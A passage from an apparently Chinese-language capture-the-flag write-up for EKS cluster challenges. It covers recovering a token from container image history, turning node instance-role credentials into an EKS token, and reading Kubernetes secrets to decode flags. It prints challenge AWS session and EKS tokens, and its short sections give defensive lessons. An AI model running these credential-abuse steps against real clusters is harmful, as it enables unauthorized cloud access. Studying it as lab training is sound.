&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_SESSION_TOKEN=&amp;#34;FwoGZXIvYXdzECEaDHrNSjwyVMWeJoAnySK3AY4Bylma9Ju6Jqbkd/atWMEqk4X6fw3K0rjYBkT6bxgfYJ3XwbO61GPombFlKMeZ68SMTWKRpCz+KF7iG1INS9rnWbIojeTOcobHVEx/JW/nlRbxvFKPBQANAY8YQSC10vt4H2QEnrRWnRvvVixUy8UegYOGFzpp7kAYX34eEFJ1x5fwaOj7hhLDJDsablkGTG4CJE/BAntFw0ncXPbryfqgiKqFnFL35SKp7QicllBtTrMwvYg0Piiv26u3BjItA+IMzCCUJOWEMmZpVeW0H/iqoTF7L32Y/SVDKGJ6KExw3ak46wV6Bw/ky7pY&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_DEFAULT_REGION=us-west-1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2024/09/18 15:21:03 logged in via /home/user/.docker/config.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;architecture&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;amd64&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;config&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Env&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;Cmd&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sleep&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;3133337&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;ArgsEscaped&amp;#34;&lt;/span>:true,&lt;span style="color:#e6db74">&amp;#34;OnBuild&amp;#34;&lt;/span>:null&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:07.782534085Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;history&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-07-18T23:19:33.538571854Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-07-18T23:19:33.655005962Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;/bin/sh -c #(nop) CMD [\&amp;#34;sh\&amp;#34;]&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;empty_layer&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:07.782534085Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;comment&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;buildkit.dockerfile.v0&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>,&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;created&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;2023-11-01T13:32:07.782534085Z&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;created_by&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;CMD [\&amp;#34;/bin/sleep\&amp;#34; \&amp;#34;3133337\&amp;#34;]&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;comment&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;buildkit.dockerfile.v0&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;empty_layer&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}]&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;os&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;linux&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;rootfs&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;type&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;layers&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;diff_ids&amp;#34;&lt;/span>:&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&amp;#34;&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-2">思考&lt;/h3>
&lt;ul>
&lt;li>在云环境中，实例元数据包含许多重要信息，包括AWS 凭证。限制和监控对 EC2 实例元数据的访问非常重要。启用 IMDSv2 并为 EC2 实例实施 IAM 角色，以动态和安全地管理凭证。&lt;/li>
&lt;li>避免在镜像层或历史记录中留下敏感数据，尤其是凭证。实施镜像扫描和管理策略，以检测和删除敏感数据。&lt;/li>
&lt;/ul>
&lt;h2 id="challenge-4-pod-break">Challenge 4: Pod Break&lt;/h2>
&lt;h3 id="题目-3">题目&lt;/h3>
&lt;p>You&amp;rsquo;re inside a vulnerable pod on an EKS cluster. Your pod&amp;rsquo;s service-account has no permissions.
Can you navigate your way to access the EKS Node&amp;rsquo;s privileged service-account?
Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-3">解题&lt;/h3>
&lt;ol>
&lt;li>获取当前 AWS 账户的身份信息&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws sts get-caller-identity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;UserId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Account&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;688655246681&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>获取 AWS EKS 集群的身份验证令，集群名称来自Arn。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws eks get-token --cluster-name eks-challenge-cluster&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;kind&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ExecCredential&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;apiVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;client.authentication.k8s.io/v1beta1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;spec&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;status&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;expirationTimestamp&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2024-09-19T14:10:53Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;token&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk03Uk1PNU9DTiUyRjIwMjQwOTE5JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNDA5MTlUMTM1NjUzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRGNhREZMdWpvdHJxSUhGMzhkekx5SzNBZHMlMkZ2bEUyWXVHeWdBZ093d1E0U2djYXpHdVllV2VhdzZsM1NuZlFDekglMkJQa3VwUFVPWHNkbkU4JTJGdWRBU0tZekhVek1HRyUyRnFHNUh1b3pSbFlmWkZVaHVwZDZwMTRwU1pwanQxeERsRWNiMk9aa1hON2lHTkVhdE83bko4UnNaYWVKUFZmWlE3bDg2NTMlMkZ1MnRtcUVyQlNQbGNNOVhGdEZFQmVHZlZYJTJGRjJKVjNwcnh0OUNTbE9MSklNSzhmY0o0UVdHT3BQYkNLUGhSMU1aNWxKOGtDQUZKYW8lMkJFbXQ4M0lTdWFNZDdpeVo3OHdpazRSYk4waWliMjdDM0JqSXQxJTJCNiUyQiUyQiUyQlJQaG9ZNmZIeElacGElMkZxSGJibyUyQmxyeSUyRjduOFBKaSUyRnpZSWhoVXZ6NkZQbWo1QkptWkVHJTJCTWImWC1BbXotU2lnbmF0dXJlPTBmOGE5MjU2YmU5YzNkODMxY2M3M2Q4ODYzN2I0NTE3YmEwZmNmMTU5OTA4OGFiMjA5YzQyMzE5Y2Y3ZTYyMWE&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>使用token进行下一步操作。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># token=$(aws eks get-token --cluster-name eks-challenge-cluster | jq -r .status.token)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl --token=$token get sa&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NAME SECRETS AGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>default &lt;span style="color:#ae81ff">0&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>service-account-challenge4 &lt;span style="color:#ae81ff">0&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl --token=$token get sa service-account-challenge4 -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: ServiceAccount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-10-31T20:07:21Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: service-account-challenge4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;671862&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: ad44848d-7b8d-4cc1-8e30-5b23c9a52c40
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl --token=$token get secret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NAME TYPE DATA AGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>node-flag Opaque &lt;span style="color:#ae81ff">1&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl --token=$token get secret node-flag -o yaml&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apiVersion: v1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30&lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kind: Secret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>metadata:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creationTimestamp: &lt;span style="color:#e6db74">&amp;#34;2023-11-01T12:27:57Z&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name: node-flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> namespace: challenge4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resourceVersion: &lt;span style="color:#e6db74">&amp;#34;883574&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid: 26461a29-ec72-40e1-adc7-99128ce664f7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>type: Opaque
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># echo &amp;#39;d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=&amp;#39; | base64 -d&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_eks_challenge&lt;span style="color:#f92672">{&lt;/span>only_a_real_pro_can_navigate_IMDS_to_EKS_congrats&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-3">思考&lt;/h3>
&lt;ul>
&lt;li>确保令牌仅发放给预期的受众并由其使用，对于防止令牌滥用至关重要。&lt;/li>
&lt;li>理解 IAM 角色如何与 Kubernetes 服务账户关联的重要性。误解这些关联可能导致安全疏忽，尤其是在复杂的云原生环境中。&lt;/li>
&lt;/ul>
&lt;h2 id="challenge-5-container-secrets-infrastructure">Challenge 5: Container Secrets Infrastructure&lt;/h2>
&lt;h3 id="题目-4">题目&lt;/h3>
&lt;p>You&amp;rsquo;ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># IAM Policy&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Policy&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;s3:GetObject&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;s3:ListBucket&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Trust Policy&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Federated&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;sts:AssumeRoleWithWebIdentity&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Condition&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;StringEquals&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;sts.amazonaws.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Permissions&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;secrets&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serviceaccounts&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;pods&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;get&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;list&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serviceaccounts/token&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;create&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="解题-4">解题&lt;/h3>
&lt;ol>
&lt;li>查看当前能获得的信息&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl auth can-i --list&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warning: the list may be incomplete: webhook authorizer does not support user rule resolution
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Resources Non-Resource URLs Resource Names Verbs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>serviceaccounts/token &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>debug-sa&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>create&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>selfsubjectaccessreviews.authorization.k8s.io &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>create&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>selfsubjectrulesreviews.authorization.k8s.io &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>create&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pods &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get list&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>secrets &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get list&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>serviceaccounts &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get list&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/api/*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
